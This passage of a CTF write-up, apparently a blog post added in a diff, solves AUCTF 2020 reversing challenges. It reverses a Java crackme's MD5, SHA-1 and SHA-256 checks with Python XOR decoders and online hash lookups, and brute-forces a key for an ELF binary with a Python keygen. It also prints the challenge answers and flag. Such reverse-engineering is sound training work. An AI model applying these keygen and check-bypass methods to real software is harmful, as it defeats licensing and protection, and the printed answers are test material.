+        <span class="k">return</span> <span class="n">mr_game_and_watch</span><span class="o">.</span><span class="na">hash</span><span class="o">((</span><span class="nc">String</span><span class="o">)</span><span class="n">string</span><span class="o">,</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span><span class="s">"SHA1"</span><span class="o">).</span><span class="na">compareTo</span><span class="o">(</span><span class="n">mr_game_and_watch</span><span class="o">.</span><span class="na">decrypt</span><span class="o">((</span><span class="kt">int</span><span class="o">[])</span><span class="n">secret_2</span><span class="o">,</span> <span class="o">(</span><span class="kt">int</span><span class="o">)</span><span class="n">key_2</span><span class="o">))</span> <span class="o">==</span> <span class="mi">0</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">crack_3</span><span class="o">(</span><span class="nc">Scanner</span> <span class="n">scanner</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">"Nice work! Here's the last one...\n\t"</span><span class="o">);</span>
+        <span class="nc">String</span> <span class="n">string</span> <span class="o">=</span> <span class="n">scanner</span><span class="o">.</span><span class="na">nextLine</span><span class="o">();</span>
+        <span class="nc">String</span> <span class="n">string2</span> <span class="o">=</span> <span class="n">mr_game_and_watch</span><span class="o">.</span><span class="na">hash</span><span class="o">((</span><span class="nc">String</span><span class="o">)</span><span class="n">string</span><span class="o">,</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span><span class="s">"SHA-256"</span><span class="o">);</span>
+        <span class="kt">int</span><span class="o">[]</span> <span class="n">arrn</span> <span class="o">=</span> <span class="n">mr_game_and_watch</span><span class="o">.</span><span class="na">encrypt</span><span class="o">((</span><span class="nc">String</span><span class="o">)</span><span class="n">string2</span><span class="o">,</span> <span class="o">(</span><span class="kt">int</span><span class="o">)</span><span class="n">key_3</span><span class="o">);</span>
+        <span class="k">return</span> <span class="nc">Arrays</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">arrn</span><span class="o">,</span> <span class="n">secret_3</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">int</span><span class="o">[]</span> <span class="nf">encrypt</span><span class="o">(</span><span class="nc">String</span> <span class="n">string</span><span class="o">,</span> <span class="kt">int</span> <span class="n">n</span><span class="o">)</span> <span class="o">{</span>
+        <span class="kt">int</span><span class="o">[]</span> <span class="n">arrn</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">int</span><span class="o">[</span><span class="n">string</span><span class="o">.</span><span class="na">length</span><span class="o">()];</span>
+        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">string</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">arrn</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">)</span> <span class="o">^</span> <span class="n">n</span><span class="o">;</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">arrn</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">decrypt</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">arrn</span><span class="o">,</span> <span class="kt">int</span> <span class="n">n</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">Object</span> <span class="n">object</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
+        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">arrn</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">object</span> <span class="o">=</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span><span class="n">object</span> <span class="o">+</span> <span class="o">(</span><span class="kt">char</span><span class="o">)(</span><span class="n">arrn</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">^</span> <span class="n">n</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">object</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">print_flag</span><span class="o">()</span> <span class="o">{</span>
+        <span class="nc">String</span> <span class="n">string</span> <span class="o">=</span> <span class="s">"flag.txt"</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">(</span><span class="nc">BufferedReader</span> <span class="n">bufferedReader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileReader</span><span class="o">(</span><span class="n">string</span><span class="o">));){</span>
+            <span class="nc">String</span> <span class="n">string2</span><span class="o">;</span>
+            <span class="k">while</span> <span class="o">((</span><span class="n">string2</span> <span class="o">=</span> <span class="n">bufferedReader</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">string2</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+        <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">iOException</span><span class="o">)</span> <span class="o">{</span>
+            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Could not find file please notify admin"</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">hash</span><span class="o">(</span><span class="nc">String</span> <span class="n">string</span><span class="o">,</span> <span class="nc">String</span> <span class="n">string2</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">String</span> <span class="n">string3</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="nc">MessageDigest</span> <span class="n">messageDigest</span> <span class="o">=</span> <span class="nc">MessageDigest</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="n">string2</span><span class="o">);</span>
+            <span class="kt">byte</span><span class="o">[]</span> <span class="n">arrby</span> <span class="o">=</span> <span class="n">messageDigest</span><span class="o">.</span><span class="na">digest</span><span class="o">(</span><span class="n">string</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="s">"UTF-8"</span><span class="o">));</span>
+            <span class="nc">StringBuilder</span> <span class="n">stringBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">arrby</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+            <span class="k">for</span> <span class="o">(</span><span class="kt">byte</span> <span class="n">by</span> <span class="o">:</span> <span class="n">arrby</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="nc">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"%02x"</span><span class="o">,</span> <span class="n">by</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="o">));</span>
+            <span class="o">}</span>
+            <span class="n">string3</span> <span class="o">=</span> <span class="n">stringBuilder</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+        <span class="o">}</span>
+        <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">exception</span><span class="o">)</span> <span class="o">{</span>
+            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"broke"</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">string3</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></table></code></div></div><p>After reading the source code we clearly see that in order to call print_flag() function crackme() function MUST return true which will happen only if crack_1(), crack_2() and crack_3() functions are true .. So let’s make those guys true!</p><ul><li>crack_1():<div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">crack_1</span><span class="o">(</span><span class="nc">Scanner</span> <span class="n">scanner</span><span class="o">)</span> <span class="o">{</span>
+      <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Let's try some hash cracking!! I'll go easy on you the first time. The first hash we are checking is this"</span><span class="o">);</span>
+      <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"\t"</span> <span class="o">+</span> <span class="n">secret_1</span><span class="o">);</span>
+      <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">"Think you can crack it? If so give me the value that hashes to that!\n\t"</span><span class="o">);</span>
+      <span class="nc">String</span> <span class="n">string</span> <span class="o">=</span> <span class="n">scanner</span><span class="o">.</span><span class="na">nextLine</span><span class="o">();</span>
+      <span class="nc">String</span> <span class="n">string2</span> <span class="o">=</span> <span class="n">mr_game_and_watch</span><span class="o">.</span><span class="na">hash</span><span class="o">((</span><span class="nc">String</span><span class="o">)</span><span class="n">string</span><span class="o">,</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span><span class="s">"MD5"</span><span class="o">);</span>
+      <span class="k">return</span> <span class="n">string2</span><span class="o">.</span><span class="na">compareTo</span><span class="o">(</span><span class="n">secret_1</span><span class="o">)</span> <span class="o">==</span> <span class="mi">0</span><span class="o">;</span>
+  <span class="o">}</span>
+</pre></table></code></div></div></ul><p>That’s easy .. the input gets encrypted using MD5 and then compared to secret_1 variable if they’re equal it returns true we need to decrypt secret_1 value and that will be our first key!</p><p>I used this <a href="https://hashtoolkit.com/decrypt-hash/">site</a> for that:</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/game-and-watch/game1.png" alt="decrypt MD5" /></div><p>Nice! <code class="language-plaintext highlighter-rouge">masterchief</code> is our first input we got one .. two to go!</p><ul><li>crack_2():<div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">crack_2</span><span class="o">(</span><span class="nc">Scanner</span> <span class="n">scanner</span><span class="o">)</span> <span class="o">{</span>
+      <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Nice work! One down, two to go ..."</span><span class="o">);</span>
+      <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">"This next one you don't get to see, if you aren't already digging into the class file you may wanna try that out!\n\t"</span><span class="o">);</span>
+      <span class="nc">String</span> <span class="n">string</span> <span class="o">=</span> <span class="n">scanner</span><span class="o">.</span><span class="na">nextLine</span><span class="o">();</span>
+      <span class="k">return</span> <span class="n">mr_game_and_watch</span><span class="o">.</span><span class="na">hash</span><span class="o">((</span><span class="nc">String</span><span class="o">)</span><span class="n">string</span><span class="o">,</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span><span class="s">"SHA1"</span><span class="o">).</span><span class="na">compareTo</span><span class="o">(</span><span class="n">mr_game_and_watch</span><span class="o">.</span><span class="na">decrypt</span><span class="o">((</span><span class="kt">int</span><span class="o">[])</span><span class="n">secret_2</span><span class="o">,</span> <span class="o">(</span><span class="kt">int</span><span class="o">)</span><span class="n">key_2</span><span class="o">))</span> <span class="o">==</span> <span class="mi">0</span><span class="o">;</span>
+  <span class="o">}</span>
+</pre></table></code></div></div></ul><p>Well, here it takes our input -&gt; encrypt it using SHA1 -&gt; compare it to the decrypted secret_2 value using decrypt() function</p><p>Now by thinking reverse! we need to: decrypt secret_2 value -&gt; decrypt the result using SHA1 -&gt; and that’s our input!</p><p>The equivalent python code of decrypt() function is:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="mi">114</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">113</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">113</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">113</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">118</span><span class="p">]</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="mi">64</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">k</span><span class="p">):</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)):</span>
+        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">k</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">result</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="n">secret</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
+</pre></table></code></div></div><p>Now running it:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 decrypt.py
+<span class="go">264212deff89ade15661a59e7b632872d858f2c6
+</span></pre></table></code></div></div><p>Now decrypting this SHA1 using the same <a href="https://hashtoolkit.com/decrypt-hash/">site</a>:</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/game-and-watch/game2.png" alt="decrypt SHA1" /></div><p>Great! <code class="language-plaintext highlighter-rouge">princesspeach</code> is our second input .. only one left!</p><ul><li>crack_3():<div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>
+  <span class="kd">private</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">crack_3</span><span class="o">(</span><span class="nc">Scanner</span> <span class="n">scanner</span><span class="o">)</span> <span class="o">{</span>
+      <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">"Nice work! Here's the last one...\n\t"</span><span class="o">);</span>
+      <span class="nc">String</span> <span class="n">string</span> <span class="o">=</span> <span class="n">scanner</span><span class="o">.</span><span class="na">nextLine</span><span class="o">();</span>
+      <span class="nc">String</span> <span class="n">string2</span> <span class="o">=</span> <span class="n">mr_game_and_watch</span><span class="o">.</span><span class="na">hash</span><span class="o">((</span><span class="nc">String</span><span class="o">)</span><span class="n">string</span><span class="o">,</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span><span class="s">"SHA-256"</span><span class="o">);</span>
+      <span class="kt">int</span><span class="o">[]</span> <span class="n">arrn</span> <span class="o">=</span> <span class="n">mr_game_and_watch</span><span class="o">.</span><span class="na">encrypt</span><span class="o">((</span><span class="nc">String</span><span class="o">)</span><span class="n">string2</span><span class="o">,</span> <span class="o">(</span><span class="kt">int</span><span class="o">)</span><span class="n">key_3</span><span class="o">);</span>
+      <span class="k">return</span> <span class="nc">Arrays</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">arrn</span><span class="o">,</span> <span class="n">secret_3</span><span class="o">);</span>
+  <span class="o">}</span>
+</pre></table></code></div></div></ul><p>So it takes our input -&gt; encrypt it using SHA256 -&gt; encrypt it using encrypt() function -&gt; compare the result with secret_3 array</p><p>thinking reverse we should: take the secret_3 array -&gt; decrypt it using the reverse of encrypt() function -&gt; decrypt the resulting SHA256 hash</p><p>The encrypt() function just XOR each character with 313 value and that’s the equivalent python code:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="mi">268</span><span class="p">,</span> <span class="mi">348</span><span class="p">,</span> <span class="mi">347</span><span class="p">,</span> <span class="mi">347</span><span class="p">,</span> <span class="mi">269</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="mi">348</span><span class="p">,</span> <span class="mi">269</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="mi">344</span><span class="p">,</span> <span class="mi">271</span><span class="p">,</span> <span class="mi">271</span><span class="p">,</span> <span class="mi">264</span><span class="p">,</span> <span class="mi">266</span><span class="p">,</span> <span class="mi">348</span><span class="p">,</span> <span class="mi">257</span><span class="p">,</span> <span class="mi">266</span><span class="p">,</span> <span class="mi">267</span><span class="p">,</span> <span class="mi">348</span><span class="p">,</span> <span class="mi">269</span><span class="p">,</span> <span class="mi">266</span><span class="p">,</span> <span class="mi">266</span><span class="p">,</span> <span class="mi">344</span><span class="p">,</span> <span class="mi">267</span><span class="p">,</span> <span class="mi">270</span><span class="p">,</span> <span class="mi">267</span><span class="p">,</span> <span class="mi">267</span><span class="p">,</span> <span class="mi">348</span><span class="p">,</span> <span class="mi">349</span><span class="p">,</span> <span class="mi">349</span><span class="p">,</span> <span class="mi">265</span><span class="p">,</span> <span class="mi">349</span><span class="p">,</span> <span class="mi">267</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="mi">269</span><span class="p">,</span> <span class="mi">270</span><span class="p">,</span> <span class="mi">349</span><span class="p">,</span> <span class="mi">268</span><span class="p">,</span> <span class="mi">271</span><span class="p">,</span> <span class="mi">351</span><span class="p">,</span> <span class="mi">349</span><span class="p">,</span> <span class="mi">347</span><span class="p">,</span> <span class="mi">269</span><span class="p">,</span> <span class="mi">349</span><span class="p">,</span> <span class="mi">271</span><span class="p">,</span> <span class="mi">257</span><span class="p">,</span> <span class="mi">269</span><span class="p">,</span> <span class="mi">344</span><span class="p">,</span> <span class="mi">351</span><span class="p">,</span> <span class="mi">265</span><span class="p">,</span> <span class="mi">351</span><span class="p">,</span> <span class="mi">265</span><span class="p">,</span> <span class="mi">271</span><span class="p">,</span> <span class="mi">346</span><span class="p">,</span> <span class="mi">271</span><span class="p">,</span> <span class="mi">266</span><span class="p">,</span> <span class="mi">264</span><span class="p">,</span> <span class="mi">351</span><span class="p">,</span> <span class="mi">349</span><span class="p">,</span> <span class="mi">351</span><span class="p">,</span> <span class="mi">271</span><span class="p">,</span> <span class="mi">266</span><span class="p">,</span> <span class="mi">266</span><span class="p">]</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="mi">313</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+    <span class="n">myStr</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">a</span><span class="p">)):</span>
+        <span class="n">myStr</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">myStr</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">decrypt</span><span class="p">(</span><span class="n">secret</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
+</pre></table></code></div></div><p>Now running it:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 decrypt2.py
+<span class="go">5ebb49e499a6613e832e433a2722edd0d2947d56fdb4d684af0f06c631fdf633
+</span></pre></table></code></div></div><p>Then i used this <a href="https://md5decrypt.net/en/Sha256/">site</a> to decrypt the result:</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/game-and-watch/game3.png" alt="decrypt SHA256" /></div><p>Finally! Our third input is <code class="language-plaintext highlighter-rouge">solidsnake</code></p><p>Now connecting to the server:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nc challenges.auctf.com 30001
+<span class="go">
+Welcome to the Land of Interpreted Languages!
+If you are used to doing compiled languages this might be a shock... but if you hate assembly this is the place to be!
+
+Unfortunately, if you hate Java, this may suck...
+Good luck!
+
+Let's try some hash cracking!! I'll go easy on you the first time. The first hash we are checking is this
+	d5c67e2fc5f5f155dff8da4bdc914f41
+Think you can crack it? If so give me the value that hashes to that!
+	masterchief
+Nice work! One down, two to go ...
+This next one you don't get to see, if you aren't already digging into the class file you may wanna try that out!
+	princesspeach
+Nice work! Here's the last one...
+	solidsnake
+That's correct!
+auctf{If_u_h8_JAVA_and_@SM_try_c_sharp_2922}
+</span></pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">auctf{If_u_h8_JAVA_and_@SM_try_c_sharp_2922}</code></p><hr /><h2 id="sora">Sora</h2><h4 id="reversing-2">Reversing</h4><h3 id="description-2">Description</h3><blockquote><p><strong>This obnoxious kid with spiky hair keeps telling me his key can open all doors.<br /> Can you generate a key to open this program before he does?<br /><br /> Connect to challenges.auctf.com 30004</strong></p></blockquote><h3 id="solution-2">Solution</h3><p>As usual using <code class="language-plaintext highlighter-rouge">file</code> command it appears it’s a 64-bit ELF file, dynamically linked and not stripped and with <code class="language-plaintext highlighter-rouge">strings</code> command we find an interesting part:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>strings sora
+<span class="c">..
+</span><span class="go">aQLpavpKQcCVpfcg
+Give me a key!
+That's not it!
+flag.txt
+Too bad you can only run this exploit on the server...
+</span><span class="c">..
+</span></pre></table></code></div></div><p>as a first assumption maybe <code class="language-plaintext highlighter-rouge">aQLpavpKQcCVpfcg</code> string is some sort of an encrypted key or something</p><p>Alright, let’s put this into radare2</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>r2 <span class="nt">-AA</span> sora
+<span class="gp">[0x00001140]&gt;</span><span class="w"> </span>afl
+<span class="c">..
+</span><span class="go">0x000012dd    7 171          sym.encrypt
+0x00001430    4 101          sym.__libc_csu_init
+0x00001229    6 180          main
+</span><span class="c">..
+</span><span class="go">
+</span><span class="gp">[0x00001140]&gt;</span><span class="w"> </span>s main
+<span class="gp">[0x00001229]&gt;</span><span class="w"> </span>VV
+</pre></table></code></div></div><p>In the visual mode we can see the encrypt() function gets called after the user enters an input:</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/sora/sora1.png" alt="r2 screenshot" /></div><p>If eax register does NOT equal zero then it prints the flag .. whatever happens in encrypt() function it MUST returns a non-zero value</p><p>Now moving to IDA pro to see the decompilation of encrypt() function:</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/sora/sora2.png" alt="IDA pro screenshot" /></div><p>The function simply encrypts the character and if it doesn’t equal the equivalent character in the secret variable it return 0 which we don’t want to happen</p><p>the secret variable has the value of our interesting string <code class="language-plaintext highlighter-rouge">aQLpavpKQcCVpfcg</code>:</p><div align="center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/posts/2020-12-18-auctf-2020/sora/sora3.png" alt="IDA pro screenshot" /></div><p>Now i wrote this python script which iterates through each character in the secret variable string and finds the printable character that satisfies the if condition:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="n">secret</span> <span class="o">=</span> <span class="s">"aQLpavpKQcCVpfcg"</span>
+
+<span class="k">def</span> <span class="nf">getkeychar</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
+
+    <span class="c1"># iterates through the printable characters only
+</span>    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">' '</span><span class="p">),</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'~'</span><span class="p">)):</span>
+        <span class="k">if</span> <span class="nb">chr</span><span class="p">((</span><span class="mi">8</span> <span class="o">*</span> <span class="n">x</span> <span class="o">+</span> <span class="mi">19</span><span class="p">)</span><span class="o">%</span><span class="mi">61</span> <span class="o">+</span> <span class="mi">65</span><span class="p">)</span> <span class="o">==</span> <span class="n">a</span><span class="p">:</span>
+            <span class="k">return</span> <span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">secret</span><span class="p">)):</span>
+    <span class="n">key</span> <span class="o">+=</span> <span class="n">getkeychar</span><span class="p">(</span><span class="n">secret</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+</pre></table></code></div></div><p>Now running it gives us the key:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>python3 key.py
+<span class="gp">75&lt;"72"%5($</span>.<span class="s2">"0(G
+</span></pre></table></code></div></div><p>Now connecting to the server:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
